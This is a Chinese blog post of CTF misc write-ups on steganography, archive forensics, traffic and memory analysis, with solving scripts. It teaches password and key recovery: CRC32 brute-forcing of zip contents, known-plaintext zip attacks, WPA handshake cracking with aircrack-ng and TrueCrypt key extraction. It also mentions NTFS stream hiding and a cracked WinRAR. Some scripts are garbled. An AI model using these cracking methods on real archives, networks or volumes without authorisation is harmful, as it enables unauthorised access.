linux下面，果然无法显示（Linux会检验CRC检验码） 然后用01Editor打开修改IHDR后面的后八位（前四位为长，后四位为宽）把后四位的A4改为F4，即改为正方形，保存显示flag。 3.啊嗒 省赛题目，前面写过wp就不写了。答题思路就是binwalk分析分离压缩包，通过exif信息找到压缩包密码解压即可。 4.又一张图片，还单纯吗 binwalk分析有很多夹杂的信息，用Foremost提取一下，直接提取出flag图像。 5.隐写2 首先用NotePad++打开文件，最后发现flag.rar binwalk分析，foremost分离。 打开压缩包发现又一个flag.rar和一个提示jpg 根据提示是3位数密码，然后公共爆破工具爆破得到密码。 解压得到一张图片，然后用Notepad++打开，最后找到flag 6.闪的好快 gif图片，很多张二维码不停跳，用StegSolve的Frame Brower打开一个个扫拼接得到flag。 最后扫描完拼接得:SYC{F1aSh_so_f4sT} 7.隐写3 下载压缩得到PNG图片，用010Editor打开发现IHDR。观察图片感觉明显窄很多。修改高度得到flag。（原理同2.隐写） 8.细心的大象 图片的文件exif有信息，但是不是flag。然后在kali linux下binwalk分析发现有RAR压缩包，foremost分离 发现一个加密的压缩包，这个时候就用到exif里面的备注了。当时直接当密码不行。需要base64解密才可以。解密后得到一张图片 貌似很熟悉的样子。上面题目刚做了。然而这次修改高度貌似显示不了，用StegSolve查看得到flag 9.爆照 Notepad++打开发现文件尾部有一段.gif的信息 binwalk分析，foremost分离得到压缩包 解压后得到一堆88888的未名文件 放到kali里面分析，直接显示为图片，而且很容易发现88有二维码扫面得bilibili 挨个binwalk分析发现88、888、8888存在修改痕迹，且8888里面夹杂zip。 分离zip发下二维码得到panama 看下888的exif 得到base64，解密得silisili 最后按照顺序连接得到flag 10.猫片 png图片。下载后常规分析：搜索、查看exif、二进制分析、CRC校验都无果。 提示：LSB、BRG（有错误，估计打错了，应该是BGR）、NTFS 用StegSolve打开LSB最低位通道查看，发现BGR里面数据是PNG图片的数据 Save Bin后用010Editor打开，发现不行。用WinHex就可以。把开头四字节删了保存，发现了一半二维码。 放到linux里面看一下是否存在CRC校验失败（判断是否修改了高度）。 果然，修该高度后找到全的二维码 但是貌似有一点莫名的异样。原来是黑白正好相反。通过StegSolve就可以查看xor后的图像了，扫面后是一个网盘，下载flag.rar 没有flag。但是我们还有一条信息没用到：NTFS。猜测应该是NTFS隐写 用NSE打开扫描发现确实 是个pyc文件，关于pyc文件我之前写过。就是编译后的py文件，在线反编译一下得到源代码 import base64​def encode(): flag = ‘*****‘ ciphertext = [] for i in range(len(flag)): s = chr(i ^ ord(flag[i])) if i % 2 == 0: s = ord(s) + 10 else: s = ord(s) - 10 ciphertext.append(str(s)) ​ 1return ciphertext\[::-1\] ciphertext = [‘96’,’65’,’93’,’123’,’91’,’97’,’22’,’93’,’70’,’102’,’94’,’132’,’46’,’112’,’64’,’97’,’88’,’80’,’82’,’137’,’90’,’109’,’99’,’112’] 写一个解密脚本解密得到flag # -- codeing: UTF-8 --​import base64​def decode(): ciphertext = [‘96’,’65’,’93’,’123’,’91’,’97’,’22’,’93’,’70’,’102’,’94’,’132’,’46’,’112’,’64’,’97’,’88’,’80’,’82’,’137’,’90’,’109’,’99’,’112’] flag = ‘’ ciphertext.reverse() #因为加密用到了append()函数 for i in range(len(ciphertext)): if i % 2 == 0: s = int(ciphertext[i]) - 10 else: s = int(ciphertext[i]) + 10 s = chr(i ^ s) flag += s return flag​def main(): flag = decode() print flag​if __name__ == ‘__main__‘: main() 11.多彩 下载后图片名字是：lipstick。翻译是口红的意思… 结合图片颜色应该是不同的口红色号吧 用StegSolve打开后找到这么一段信息 这些口红颜色和YSL什么关系？搜一下发现是一个口红的品牌。继续搜索信息发现LSB最低位里面有PK字段，应该是压缩包数据。 果断保存二进制为.zip格式。但是打不开，因为后面有一堆没有的数据。用binwalk分离一下就好了。 分离出来发现是个加密的压缩包。那么秘密是什么？和YSL口红色号有什么关系？ 有点脑洞了。搜索后发现是N1CTF国际赛的一道题目。。。秘密啊竟然是YSL对应口红色号的二进制转字符串。。。 用PS取色： &#39;BC0B28&#39;,&#39;D04179&#39;,&#39;D47A6F&#39;,&#39;C2696F&#39;,&#39;EB8262&#39;, &#39;CF1A77&#39;,&#39;C0083E&#39;,&#39;BC0B28&#39;,&#39;BC0B28&#39;,&#39;D13274&#39;, &#39;6A1319&#39;,&#39;BC0B28&#39;,&#39;BC0B28&#39;,&#39;D4121D&#39;,&#39;D75B59&#39;, &#39;DD8885&#39;,&#39;CE0A4A&#39;,&#39;D4121D&#39;,&#39;7E453A&#39;,&#39;D75B59&#39;, &#39;DD8885&#39; 进入YSL的网站：https://www.yslbeautyus.com/on/demandware.store/Sites-ysl-us-Site/en_US/Product-Variation?pid=194YSL 可以看见：color=1 抄个脚本吧..（眼力好也可以手撕）（发现抄的脚本看不懂也运行不了，手撕） 最后得到色号：1,27 ,59 ,11 ,23 ,7 ,57,1 ,1 ,76 ,222 ,1,1,50 ,214 ,6 ,77 ,50,53,214 ,6 写脚本转换成二进制再转换成和字符 import libnum​color = [1,27 ,59 ,11 ,23 ,7 ,57,1 ,1 ,76 ,222 ,1,1,50 ,214 ,6 ,77 ,50,53,214 ,6]flag = ‘’for i in color: flag +=str(bin(i)[2:])print libnum.b2s(flag) 解压得到flag 12.乌云邀请码 Stegsolve，LSB，BGR分析直接得到flag 13.图穷匕见 用010Editor打开，根据题目意思应该是在这张图的后面还有数据。 FF D9是jpg文件头，提取后面的数据。然后用Notepad++的Converter功能吧16进制转为字符。发现是一堆点。加上提示：问会画图吗？猜测应该是合成二维码。 用python的Image库生成反向图片 14.color 省赛题目，当时也是没做出来。前面wp也写了。思路就是用SteSolve打开发现隐藏Hint：makemetall。修改高度得到黑白块，联想二进制和ascii码的可打印字符正好是7位（坑点：七张图片要竖着组合01）。 15.2B binwalk分析发现存在zip文件，foremost分离出来 压缩包加密了，用01Editor打开搜索50 4B 01 02，发现是伪加密。 修改后解压得到另一张看似一模一样的png图片名字叫B2。猜测双图还是盲水印？答案是盲水印。脚本有两个，一个可以另一个不可以。不知道为啥。。 16.妹子的陌陌 binwalk分析发现存在压缩包，foremost分离出压缩包 压缩包有密码，经过尝试给的信息，竟然是：喜欢我吗.有点脑洞…. 然后摩斯电码解密得到一个网址 进去加上后面的提示，应该是吧有=的看似想base64的用AES解密，而且给出了秘钥。 然后进去网站发现二维码，取反色扫描得到flag。 (二)、流量分析1.talnet 直接搜索分组字节流，找到flag。也可以过滤talnet协议定位，追踪流找到flag (三)、压缩包分析1.眼见非实 Notepad++打开后发现是PK文件头，最后有一段.docx。 修改后缀为zip，解压得到.docx文档，但是打不开。 再用Notepad++打开发现PK头，修改后缀为zip。解压得到文件夹，搜索找到xml文件里面有flag 2.神秘文件 省赛题目。加密压缩包和压缩包外有相同文件，用ARCHPR明文攻击即可。注意一点要用WinRar。然后解压得到.doc。查看文本发现PK开头，改后缀为zip。找到flag.txt然后base64解码。详解看上面WP 3.好多压缩包 这么多小压缩包肯定先想到CRC32碰撞攻击。 原理： CRC32:CRC本身是“[冗余校验码](http://baike.baidu.com/item/CRC32)”的意思，CRC32则表示会产生一个32bit（8位十六进制数）的校验值。CRC32校验码出现在很多文件中比如 png 文件，同样 zip 中也有 CRC32 校验码。值得注意的是 zip 中的 CRC32 是未加密文件的校验值。这也就导致了基于 CRC32 的攻击手法在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理我们可以直接爆破出加密文件的内容限于CPU能力，CRC碰撞只能用于压缩文件较小的情况 破解脚本： # coding:utf-8import zipfileimport stringimport binasciiimport base64​​def CrackCrc(crc): for i in dic: for j in dic: for p in dic: for q in dic: s = i + j + p + q if crc == (binascii.crc32(s) &amp; 0xffffffff): # print s f.write(s) return​​def CrackZip(): for I in range(68): file = ‘out’ + str(I) + ‘.zip’ f = zipfile.ZipFile(file, ‘r’) GetCrc = f.getinfo(‘data.txt’) crc = GetCrc.CRC CrackCrc(crc)​​dic = string.ascii_letters + string.digits + ‘+/=’​f = open(‘out.txt’, ‘w’)CrackZip()f.close() 爆破完成得到base64 用python脚本解密写进jm.txt里面 #coding:utf-8import base64​file = open(‘out.txt’,’r’)c = file.read()m = base64.b64decode(c)file = open(‘jm.txt’,’w’)file.write(m)print ok 用01Editor打开发现Hint：修理文件得flag。而我们在十六进制中发现C4 3D 7B 00 40 07 00查阅得知这是rar文件结尾。 新建一个文件，打上rar文件开头十六进制，然后复制前面的数据后保存得到压缩包 注释里面得到flag 4.一个普通的压缩包 用Winrar打开发现说文件secret.png头被破坏 使用Winrar自动修复功能，对比两个压缩包明显发现大小不一样。但是修复的完全可以解压未修复的假flag.txt猜测第一个压缩包里面藏着secret.png但是文件头被损坏。用binwalk也分析不出来 发现这个地方。A8 3C后面是被压缩文件文件头类型。把7A改成74再解压就得到了secret.png 用StegSolve打开，在一个通道发现一半二维码。而且存在两帧 应该把第二帧提取出来在一个通道可以找到另一半。保存第二帧找到另一半拼接而且还得补全左上角，扫描得到flag (四)、内存取证1.Linux 提示Linux，下载文件是一个不知名的文件。根据提示放到linux下file命令看看 是一个映像文件，我们尝试挂载 找到目录即可找到flag文件 2.linux2 法一： Notepad++直接搜索key得到flag。但是我觉得这个题肯定不是这么做，这是个非预期做法。 法二： 不知名的文件，接近20MB。放linux下file和binwalk分析 和上个题目类似，也是内存镜像。我们尝试挂载，发现一堆文件。观察上图发现一个jpg文件。我们尝试foremost分离得到jpg。然而并不是flag。 最后貌似懂了出题人想考什么：应该是考linux的strings命令 (五)、音频隐写1.旋转跳跃 MP3文件，听一下（真好听）。关于MP3的除了曲线就是MP3隐写了。用工具MP3Stego分析得到flag 2.听首音乐 用Audacity打开后发现 放大 这就很容易猜想了。三种状态：点、短横、空格正好对应摩斯电码的三种符号：.-/ 手撕电码解密得flag 3.PEN_AND_APPLE NTFS流隐写，一种以前木马的隐藏方式 隐藏方法：type flag.png&gt;pen_and_apple.mp4 查看方法：dir /r 四、Other1.宽带信息泄露 给出一个.bin二进制文件，但是不知道什么生成的。根据题目提示用RouterPassView打开，搜索username找到flag。 2.come_game 提示通关就有flag。下载后发现是一个exe的小游戏，既然放在MISC应该不会用到Re。随便玩一玩发现很难通关，不可能通关玩。 退出后生成了一个save1文件，猜测应该是存盘。这样的话我们把存的关数修改不就可以通关了吗？用010Eeditor打开修改数字2，一个个修改。最后到5的时候打开游戏就是通关了。 3.做个游戏 提示坚持六十秒，同上个题目差不多。不可能达到他的要求。jar文件我们尝反编译查看源码找到flag。 符强大的java在线反编译网址：http://www.javadecompilers.com/ 4.想蹭网先解开密码 给了个.cap流量包，用wireshark打开。提示WIFI密码，WIFI连接认证的重点在WPA的四次握手包，也就是eapol协议的包，过滤一下 正好四个包。接下来根据提示写个字典。 通过kali里面的aircrack-ng破解就可以得到key了，key就是flag了。 6.账号被盗了 不抓包直接getflag提示you are not admin！ 抓包把flase改成true。得到连接，访问下载exe文件。 打开后是一个刷枪的工具 尝试提交，抓流量包发现明显有base64编码。 解码是163邮箱。获取账号密码登录后得到flag。 7.好多数值 一看就是很多RGB值让我们绘制图片，先分析绘制图像的长宽。用python分析一下数据的长度。 开方开不尽，所以不是正方形。分解质数得到503*61*2。python脚本跑测试一下是122*503。得到flag 脚本： from PIL import Imageimport re​x = 503 #x坐标 通过对txt里的行数进行整数分解y = 122 #y坐标 x*y = 行数​im = Image.new(“RGB”,(x,y))#创建图片file = open(‘1 (1).txt’) #打开rbg值文件​#通过一个个rgb点生成图片for i in range(0,x):• for j in range(0,y):• line = file.readline().replace(‘(‘,’’).replace(‘)’,’’)#获取一行• rgb = line.split(“,”)#分离rgb• im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2])))#rgb转化为像素im.show() 8.很普通的数独 并不知道什么是数独。但是这25张图片加上里面的白黑相间很容易想到是个5*5的二维码。 关键是如何把他们拼接成二维码？…. 看了大佬的wp是用Python的PIL库来处理。把数字涂黑然后拼接生成二维码。大致思路是计算一张图中的 81 个格子的位置，然后看每一个格子中心的一堆像素（比如设置了 6 x 6）中是否有黑色像素。如果没有说明是白格子，跳过；如果有说明是有数字的格子，涂黑。 贴个大佬脚本： from PIL import Image​def work(s): im = Image.open(“{}.png”.format(s)) width = im.size[0] height = im.size[1] newim = Image.new(“RGB”, (width, height), (255,255,255)) print(im.size) print(newim.size) sx = sy = 2 for i in range(width): for j in range(height - sy): try: p = im.getpixel((i, j)) newim.putpixel((i,j), p) except: pass#print(i, j) xx = yy = 14 blockx = 23 blocky = 22 r = 3 rr = 12 for i in range(9): stx = int(xx + i * blockx) for j in range(9): sty = int(yy + j * blocky) flag = False for x in range(stx - r, stx + r): for y in range(sty - r, sty + r): p = newim.getpixel((x, y)) if p == (0,0,0): flag = True break if flag: break if flag: for x in range(stx - rr, stx + rr): for y in range(sty - rr, sty + rr): try: newim.putpixel((x,y), (0,0,0)) except: pass newim.save(“{}-1.png”.format(s))​for i in range(1, 26): work(i) 拼接后扫码得到多重base64 Vm0xd1NtUXlWa1pPVldoVFlUSlNjRlJVVGtOamJGWnlWMjFHVlUxV1ZqTldNakZIWVcxS1IxTnNhRmhoTVZweVdWUkdXbVZHWkhOWGJGcHBWa1paZWxaclpEUmhNVXBYVW14V2FHVnFRVGs9 多解码几次得到flag 9.QAQ 用01Eidtor打开发现有encode、.txt、base64、key、encrypt等字样猜测可能是pyc文件（py文件编译后）放到kali里面用命令查看一下确实是个pyc文件 在线反编译一下得到源码。 #/usr/bin/env python# encoding: utf-8​def encryt(key, plain): cipher = ‘’ for i in range(len(plain)): cipher += chr(ord(key[i % len(key)]) ^ ord(plain[i])) return cipher def getPlainText(): plain = ‘’ with open(‘plain.txt’) as f: while True: line = f.readline() if line: plain += line else: break return plain def main(): key = ‘LordCasser’ plain = getPlainText() cipher = encryt(key, plain) with open(‘cipher.txt’, ‘w’) as f: f.write(cipher.encode(‘base_64’)) if __name__ == ‘__main__‘: main() 然后还给了一个文件。三段数据，应该是用到脚本里面。 然后审计代码尝试写解密python脚本 过几天抽时间写吧，先放一下 解密后… 10.apple 未完代更新]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JarvisOJ-MISC-WP]]></title>
    <url>%2F2018%2F11%2F23%2FJarvisOJ-MISC%3AWp%2F</url>
    <content type="text"><![CDATA[流量分析远程登录协议解法一：过滤分组字节流搜索flag追踪到数据包解法二：题目是：远程登录协议。所以过滤talnet协议定位，追踪流找到flag简单网管协议直接过滤分组字节流，找到flag。也可以过滤网管协议(SNMP)定位在追踪流找到。struts2漏洞直接分组字节流过滤flag得俩：根据题目提示是大写MD5，得flag。 但是感觉这个题目也太简单了吧。。。搜了下struts2，原来是一个apache框架。而且存在不少高危漏洞。(CVE-2012-0838、CVE-2013-2251，2248、CVE-2016-3081)大多数是属于远程命令、代码执行漏洞。 shell流量分析 发现主要是57370端口（控制端）和2333端口（被控端）间的通信。通过“$”不难猜到是shell交互。 过滤分组字节流定位flag发现一段有flag{xxxxxxxxx}： 追踪TCP流： 分析shell交互找到以下几段可疑点： 把function.py运行发现输出： 审计代码发现import base64结合可疑点cat flag猜测应该是对mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA==用fuction的decode函数进行了加密。 然后在py脚本里面添加一段代码即可： 运行脚本得到flag： Webshell分析 过滤分组字节流，分别过滤shell和flag定位追踪流，发现只是变量或名字并没有内容。 题目要求分析webshell先过滤出http流。最后找到base64字符串(有点脑洞啊)aHR0cHM6Ly9kbi5qYXJ2aXNvai5jb20vY2hhbGxlbmdlZmlsZXMvQWJUekEyWXRlRmpHaFBXQ2Z0cmFvdVZEM0I2ODRhOUEuanBn 解密发现网址：访问的二维码扫描得flag SCAN 是个log日志，notepad打开发现是个二进制文件。用wireshark打开(竟然可以….)。第一个包就是一个ICMP协议的Ping包，是192.168.0.9-&gt;192.168.0.99的大量访问。 过滤ICMP协议，包并不多。(可以一个个尝试) 可以根据时间段划分为四部分：0、1200、1400、1600。 第一次是192.168.0.9-&gt;192.168.0.99然后中间一部分交互。 第二次是192.168.0.1-&gt;192.168.0.99 第三次是192.168.0.254-&gt;192.168.0.99 第四次是192.168.0.199-&gt;192.168.0.99 所以第四次的包名字sha256加密后的flag。 隐写术教练，我想打CTF 用StegSolve打开图片,LSB最低位通道分析，发现文件头为PK(压缩包文件头) 把二进制导出修改文件后缀为zip： 发现压缩文件损坏，这时候可以用WinRAR修复功能。(扯一句，WinRAR确实比Bandzip、7z什么的好用…省赛就是没用WinRAR损失一道题目。不过WinRAR有广告,大家可以去52破解下载去广告版。dalao也可以自己去壳破解改入口) 成功修复解压后，打开文件发现是ELF文件(Linux中类似Windows的exe文件，可以直接执行) 直接Linux运行得flag： Class10 拿到一个没有后缀不知名文件。在kali里面用file命令检查一下：是个二进制文件 binwalk分析一下： 有两段zlib压缩后的数据，第二段为default compression。 然后strings命令分析： 发现IHDR,RGB,IDAT等和图像相关的字符。 用binwalk分理处class10中的压缩数据： 用python打开zlib： 发现二进制的长度为841，正好是29^2。联系上面得到的信息，猜测应该是二进制转成图像。 写个python脚本： # -- coding: utf-8 --​from PIL import Image​SIZE = 29img = Image.new(“RGB”,(SIZE,SIZE))with open(“./F4289”) as f: str = f.read()​i = 0for y in xrange(SIZE): for x in xrange(SIZE): if str[i] == ‘0’: img.putpixel([x,y],(0,0,0)) else: img.putpixel([x,y],(255,255,255)) i = i + 1img.save(“ima.png”) 得到一张二维码图片：扫描得到flag。 炫酷的战队logo 下载后发现是一个打不开的BMP文件。 010打开后发现BMP文件头被抹掉。 查阅信息后发现BMP位图信息头为一个结构体长40。大体固定为： 修复后可以打开，用binwalk分析发现有zlib提取后无果。用nodepad++打开发现文件后面有一堆数据，而且有IHDR字样，猜测应该隐藏一了张png图片，但是这张图片的文件头也被损坏了，所以binwalk分析不出来。 修改文件头无果仍然打不开 看别人写的wp是有一个crc校验值，然后可以反推高度宽度。但是由于Windows系统无视crc校验值(即crc校验值不对也可以显示，但是Linux就不可以)所以利用Window的特点可以达到修改图片高、宽度来隐藏信息的目的。 python爆破: for i in range(16,256): print hex(i)[2:] b=hex(i)[2:] a=(‘89504E470D0A1A0A0000000D49484452000001’+b+’000001000802000000F37A5E12000000017352474200AECE1CE90000000467414D410000B18F0BFC6105000000097048597300000EC300000EC301C76FA8640000072549444154785EEDDAB996DD380E0050E70E2B745491B3F9FFCF1B2D04454214A537AF8EDB5D736F262E00A807CAEEE507000000000000000000DFDCC7E77F569F1FE5F9EFF2F3D7EFADBCC54D85B1F2F7AF9F6564E0EF3E2CFC059A3B77185EAB729D0ECBC51AEE0E5B94E18AE64A96F9947194EBDEF5AE54458E76339DD53C75E129F35D90B2A13FF670F045FD516E4E128B6719F3618F0439F85794FF3FC5AF255665EB3EF16641702B7D410E6DF39DFB74B5F4EAE5EED51661B8A25E903A7B64BBCC3535DF35983D020E2B9C5FBDB2E57C8CC6BCE252519F6638F89AA8E4598C47ABD361DBB3F667FC82F217AFC51FFCB2ABB2A6CECE7F0C78D3E9261D6D5C7AAFE9EBB61B3F3E874D9E3B36760F1BB94C1E17E361AEE47657BBFF54E7B27B50407759EF945DD3227BA34FC278F03551FFB35262F52B19EB1BDAB479BEA0FCC50BF1E3A73CBFC7BCE6CD9A606E7093A23BB7A1DAD5779D18BBD2058EFDC37B5D2663EE3E57BD491FFBD275E1E30A8B1263585053C3C5FCA6965112A6733C90236CCE8365A468266A998B18EE17AF3E3F2E2A2DA5C6535F469242943DBF7F97028E439FCB3F6B3336F5366FEE71FC08D56E3EDB574D6B8277B57D5D447BAF43CF7A7515BBD2C20830DC5F26CBDC835CCDCDDB2C253EAF7033AD67D11EFE52BAD0A3B2F6894B39C2260DE6A831514FDC588F735ABF8CE63CFDF1E3695A6F0A7144887CF12A73AE919A31BE925544791AFF51EDB1EC6611BCE7D48DD1BCFB483CDDF7616EFA22E2B7EA92BEC71FE4EA8BEB86E615F665A41A0F83F82365595D54B7352E736C72844D3F385CB228E311BF9CAC2C8B73C66C0ED2CFC7D329472B85682394A912EDAAE056EC3EC78B81A7F1FBB936F2A61F9ED604EF4ADD57A566BDEFC3DCD6C5287EEAFC787C90ABBF499B6715E63206AB23D0229DE164504655C34C830C23F4834D3D8BBAB21F3EECE9E29CE99DD6DDFD7C3C0D0F1252883E4254B33EE55C23A38C6D8CE7F1FB5DC7BE2286CBBA6951F0A6D47D9BA6E7EA746DCB2BB9AD8BFE5634CA4433FE20577F9336CF2BDC0DD747F18B2761066534E6B3BBE19A3CD854B559276AF9D95E774CC72972C87E3E9E5E29F522C3F29C738D8C321E11D6A7A7F1633CA5CBDB57FBD8B42E78C7A8AF5BD1ADB75DD85F866AD4D6D5BEA74EDDE72A2BBAF9C715861C244ABC28726054C6613EBBBBBEEDB98AA3BAC532358F9E635C9D759F8FA769A929C4B9CAAEC287E76E16D5ED7D4DB7F14B5DEDCAC569FBBE6C5A14BC69D0D7BDA689BB355FF73F3C1D616F73E5AFC2E66ED732DF668F42CBDABA7B58E1582AE3E357933685BF12CBF27D1FD711452E73837A7FFEFA8C64CDC24DAA26658DD5D35ACB9E589333AC6A4DAB69B06365AE30069EC76F468FC579FBFE3CAD09DE156D376BB4DAE9BDB6D18F45FDE8A9AD3B65B29D9BE74A57BA9AEE8A123A35C4C5D671C1452A631462B67D374E7C1CED3C5FE6061BEBAED3EB4E8BE3BF90F76FE6483A5022C49AF10FDABCE369B0E16FB1BA3EC1E622FEF81DAE62FBBE715A13BC2BFAF3AED1CEFDDFF779EDE8343CBE154599CC73D7B9D295EE5CEFCA33EDF6F3AE625870712AA38F32DBDA49C9FB63A54F4417346D3CE662A2597DAC5DE2F7F3F1347C9F211D76906153D34C8335199BF3B5B15E8E5F27AA76C53E3BAD09FED5CA0DC837866F2BBE797FECBBB67FAC7D46F9C62EFF8AC1F7F4673FA3F52FBCFEA0E65B2BF7CA67F4FFC33FF119D55BF0CF69FEEDDDE1A54BF97E843FE66B4BBD8AF6C7FFA11E000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080A11F3FFE0B3B73B0698B976EA80000000049454E44AE426082’).decode(“hex”) f=open(b+’.png’,”wb”) f.write(a) f.close() 挨个查看得到flag(眼力要好才能发现….): 上帝之音 根据提示用MATLAB查看时域波形(不太懂…通信内容..):几乎全看(chao)别人wp [x,fs] = wavread(‘godwave.wav’);​N = lenthg(x); 可以看出来这是OOK信号，因此可以先全波整流，然后低通滤波解调出基带信号。（dalaoshuo） fc = fs / 100;​lpf = fir1(30,fc / (fs / 2) );​x = abs(x);​xs = filter(lpf, 1, x); 绘制基带信号： 通过观察，以64个点作为抽样判决周期，提取出基带数据，即线路码。 然后根据第二个提示:是曼彻斯特码，将其解码。查看16进制：8950 4e47 0d0a是个gif格式的图像，改后缀得到二维码，扫描得flag。 基带解调MATLAB代码： close all; clear; clc;​[x, fs] = wavread(‘godwave.wav’);N = length(x);​fc = fs / 100;lpf = fir1(30, fc / (fs / 2));​x = abs(x);xs = filter(lpf, 1, x);figure;plot(xs(1:1000));ts = [48:64:N];​xb = int8(xs(ts) &gt; 0.3);​fp = fopen(‘demod.txt’, ‘w’);for i = xb fprintf(fp, ‘%d’, i);endfclose(fp); 曼彻斯特解码Python: with open(‘demod.txt’) as fp: s = fp.read()​m = ‘’for i in range(0, len(s), 2): if (s[i] == ‘1’) and (s[i+1] == ‘0’): m += ‘1’ elif (s[i] == ‘0’) and (s[i+1] == ‘1’): m += ‘0’ else: print(‘wrong with index %d’ % i) exit()​with open(‘demod.bin’, ‘wb’) as fp: for i in range(0, len(m), 8): byte = bytes([int(m[i:i+8], 2)]) fp.write(byte) 内存取证取证2 用到取证神器：volatility。解压缩到的一个vmem文件(VMware的虚拟机内存快照文件)和一个不知名的文件。 用volatility分析mem.vmem： 可以得到profile类型 查看一下进程： 发现： 这是一个加密工具。对于TureCrypt专门破解工具：Elcomsoft Forensic Disk Decryptor dumpTrueCrypt进程： 然后用TurCrypt专门破解工具：Elcomsoft Forensic Disk Decryptor 破解suspicion。 挂载得到flag： OtherYou-Nedd-Python 运行给的flag.py提示输入key：(flag.py的运行逻辑是把数据base64解码，然后zlib解压，marshal.loads函数将数据流转换成code object。而code object是可以转化为pyc的) 我们还有一个文件没用到，文件名字是：key_is_here_but_do_you_know_rfc4042推测应该是用这个文件来获取key。 我们打开发现乱码： 根据提示：cfc4042（rfc4042中定义了utf-9和utf-18两种Unicode转换编码格式）。然后用utf-9模块，把utf-9转换成utf-8编码： #coding utf-8import utf9​utf9_file = open(‘key_is_here_but_do_you_know_rfc4042’,’rb’)utf9_data = utf9_file.read()decoded_data = utf9.utf9decode(utf9_data)​print decoded_data​decoded_file = open(‘decoded’,’w’)decoded_file = write(decode_data)decoded_file.close() 得到： 看别人wp是仔细观察法，发现除了“”外其他符号都是Python中的算术运算符，括号表示优先级。然后脑洞下划线的个数为对应数字。(给脑洞大佬掉头..) 然后把数字转为16进制然后转化为ASCII字符就是key。我修改的脚本如下： #coding = utf-8 import binascii​_ = 1_ = 2_ = 3__ = 4_ = 5__ = 6___ = 7____ = 8_____ = 9n = ___*((//+_+__-%)**((%(-))+____+(%++__%+____-(__//(__%)))))+*(((__/)+_%+_____-(____//))*(_(_+)+__+_____%))+_____(((_____//+__%)+(_____-))**((__+___)+_____-(__//)))+_____((+__-(__//-____%%))**(__++))+*(+_____-(//-_____%___%))(_____-+___)+(+____)(____%_%++_)+(___-)((//-_%%)+____)**(-(__//___+_____%)+___)+(+(____%___)\+)**__+___(((_____%___)\+_____-(____//____))**___)+(____/)*(((__-+___)(__+____))*\)+*((+___-)**__)+*(((+____-__/_+-_____%___%)(-+__/+___%_____))*\)+(//)*(((__%_%++)%__)+___-)**+__*((__/(__%))+___)((_____%___)+___+)+//+_____+_____/___​print nhexn = hex(n)[2:]print hexn​key = ‘’​for i in range(len(hexn)/2): key += chr(eval(‘0x’+hexn[2*i:2*i+2]))​print key 输入key： 再回到出发点flag.py输入key发现又让输入flag 根据一开始提到的，编写代码将code这个Python代码对象加上相应pyc文件头信息提取出来写入磁盘生成pyc文件(关于pyc文件类似于java编译后的.class；运行机制类比java的JVM)。然后反编译得到源码。 在线python反编译： #!/usr/bin/env python# encoding: utf-8​import hashlib​def sha1(string): return hashlib.sha1(string).hexdigest()​​def calc(strSHA1): r = 0 for i in strSHA1: r += int(‘0x%s’ % i, 16) return r ​​def encrypt(plain, key): keySHA1 = sha1(key) intSHA1 = calc(keySHA1) r = [] for i in range(len(plain)): r.append(ord(plain[i]) + int(‘0x%s’ % keySHA1[i % 40], 16) - intSHA1) intSHA1 = calc(sha1(plain[:i + 1])[:20] + sha1(str(intSHA1))[:20]) return &apos;&apos;.join(map((lambda x: str(x)), r)) ​if __name__ == ‘__main__‘: key = raw_input(‘[] Please input key:’) plain = raw_input(‘[] Please input flag:’) encryptText = encrypt(plain, key) cipherText = ‘-185-147-211-221-164-217-188-169-205-174-211-225-191-234-148-199-198-253-175-157-222-135-240-229-201-154-178-187-244-183-212-222-164’ if encryptText == cipherText: print ‘[&gt;] Congratulations! Flag is: %s’ % plain exit() else: print ‘[!] Key or flag is wrong, try again:)’ exit() 分析加密函数：def encrypt(plain, key) 在for语句，可以知道到明文长度和密文长度相同，核心加密语句为第6，7行，算法使用ord函数取得明文每个字符的ASCII整型值，int函数内容为明文每个字符位置模40访问由调用sha1函数返回的40位16进制keySHA1字符串中的16进制数并转化为10进制数与由调用calc函数返回的整型值相减，然后将ord函数和int计算所得值作为密文添加到r列表，第7行更新intSHA1值，第9行转换为“-185-147-211…”格式并返回。 这里我们知道了密文cipherText，密钥key，加密算法encrypt，从而能逆推出解密算法，只要把密文值减去int函数中的值并对结果使用chr函数取得明文plain。 贴别人的解密脚本： #coding:utf-8#decrypt.py import hashlib​def sha1(string): return hashlib.sha1(string).hexdigest()​def calc(strSHA1): r = 0 for i in strSHA1: r += int(“0x%s” % i, 16) return r​def decrypt(strCipher,strKey): listCipher = map(lambda x: int(x),strCipher.replace(‘-‘,’ -‘)[1:].split(‘ ‘)) strKeySHA1 = sha1(strKey) intSHA1 = calc(strKeySHA1) strPlain = ‘’ for i in range(len(listCipher)): strPlain += chr(listCipher[i] + intSHA1 - int(“0x%s” % strKeySHA1[i%40],16)) intSHA1 = calc(sha1(strPlain[:(i + 1)])[:20] + sha1(str(intSHA1))[:20]) return strPlain​if __name__ == ‘__main__‘: strCipher= ‘-185-147-211-221-164-217-188-169-205-174-211-225-191-234-148-199-198-253-175-157-222-135-240-229-201-154-178-187-244-183-212-222-164’ strKey = ‘I_4m-k3y’ strPlain = decrypt(strCipher, strKey)print strPlain 这题还算是MISC吗…..真麻烦，要是不参考别人文章还真是搞不出来。 参考： https://blog.csdn.net/Magic1an/article/details/77418275 